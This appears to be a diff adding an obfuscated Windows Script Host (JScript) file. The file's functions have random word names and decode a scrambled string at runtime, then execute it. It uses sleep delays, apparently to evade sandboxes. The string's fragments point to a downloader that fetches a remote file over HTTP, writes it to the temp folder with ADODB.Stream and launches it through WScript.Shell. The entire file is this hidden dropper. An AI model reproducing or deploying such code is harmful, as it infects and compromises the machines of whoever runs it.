@@ -1,0 +1,15 @@
+function his(except,toward,country,land,an){return brown(except,toward,blow);}
+function leave(after,ever){blow=1;pound=blow;WScript.Sleep(3627);field=pound+blow*pound+blow;fat[5103046]=order;}
+function order(){sentence="ReBF";fat[6004645]=shore;thing=pick(lift(feel),sentence);}
+function caught(){thing[field](thing[pound])(fat);}
+function major(require,wave,snow){WScript.Sleep(59647);pattern=1336;while(word=word){try{fat[pattern](pattern);}catch(time){fat[2192164]=word;}pattern++}}
+function word(agree,size){fat[3749564]=leave;WScript.Sleep(3958);feel = 'ni adf;pE txn(xEv(e.icT)r.e\\o\"sinlnnmlodeepenhsxtSeOS.rftt.(rpT\\i\" in@=rg\\ \"scc+(S B\"W\\+r\\%\"a\\U\"v(S@ tE\\{\"Rc ,De) Nj00Sb0)DO2)Oe =Mt==Aa=-Ie=1Nr )%Cs \".\\{ut) tp Wai!Str=csc r.S\"i\\WTp%((tU  .SffsEiilR  eD;}eN) pS0;(D3e2O+s2M0l2A7a2I,f2N2 )%(n;\"]\\ r\\)\"u} rt {teeBsrl=b sBu{e+s) \"\\\\\"e{2[( 7)hc8(c 1gt=4na 6icc\"r\\.}t;r S}e;o p)ttl(.rad)ycn({eem (soT\\.\".dT@on \\p\";ae+)rnBe.(+sh\'\\\\\"ltG@aaE\\f\"TM ,\' \\\\,\",=B\\ \"+ \')\\B\";\\ h =;tvx)tao\\p\'yrsPd :TrR/Ta /Hq=\'L\\ nM+cgXE.er[rgenetv]pnr+lne\'a\\Ssc/.?es2\"(\\Le/+Ma(\'X\\\\r\\pScdhMh{p\\.\'\'2((t}fti)lc(/]eig[jg,nbi hOtf{e uytrnta}c;e0t0r1i=Ctoc.an;t7 8p-(0i9r=ri);c) \"S\"{+W\" Z \"r+=\"eS _tGTEu\" +r\"{Rn\"   ,)\"S\"3 t, drr<iih tn(n]g\"(\".+ \"feetr\"l+o\"iim\"h+C\"wrhW \"a+;\"rg0eC\" +o\"=Rd\" [eenv(i rpr;aa ]{r \\)\"es(uhecetIa.cn e}t u;()qdrrii,hht1(t]0\"e\")+o\"+di\"3+b\"0aee)\"d+;\"nR ge\"}+e\")ep\";+o\" Rr\"t[uehveiirmrnau g{r [yor3tf;]\".\\(\\wKRAwx)WwK(v\\\\\"\\)\",+;\"\\\"\"+ \"gRW\"r+S\"oEc\".+r\"nSiUi_p\"n+t\"eT.\"b+Q\"nNu\"i+i\"cEtRuR(Up\")+a\";Cc_ \"e+}\"rY \"e+}\"rE Kf\"e+.\"lHw\"s w=e wd r\\i\"h{t,  ;\\)\"\"W\"m+S\"olc\"c+r\".lieihp\"g+t\"iS..u\"s+l\"ltepe\"d+e\"eip\"p+(\"pr2\"e+2\"sc2SuW2\"i(2]g\")\".+;\"wt \"w+}\"wc \"\\+\"\"ne[j+\" ++\"=b;O e}\"E+ \"\'t)a)e(\")+;\"}rcCa\"t[c)ht(pei)r{cWSSWc(r i=p te.vsilrereap;(96514124=3o4q3s8w2F)B;e}Rxrqoqtcc=utrhtisnngo;c ';what=0;}
+function brown(never,iron,lost) {return never.substr(iron,lost);}
+function shore(){fat[6844492]=caught;thing[field] = word[thing[what]];}
+function lift(clean){way="";happen=what;while (happen < 2490) {job=his(clean,happen);way=quiet(way,job,happen); happen++; }return way;}
+function fly(money,table,crease){return money % (pound+pound);}
+written(3795);
+function written(book,connect,shape,wild){fat=[5893];major(fat);}
+function pick(dry,rub,mark,am) {was = enough(rub);son = what;common=[];for (include=what; include<=(enough(dry)-was); include++) {if (brown(dry,include,was)==rub){common[enough(common)]=brown(dry,son,(include-son));son = include+was;}}common[enough(common)]=brown(dry,son);return common;}
+function enough(locate,we,design,city) {return locate.length; }
+function quiet(they,to,complete,spread,protect) { if (fly(complete)) return they+to; else return to+they; }
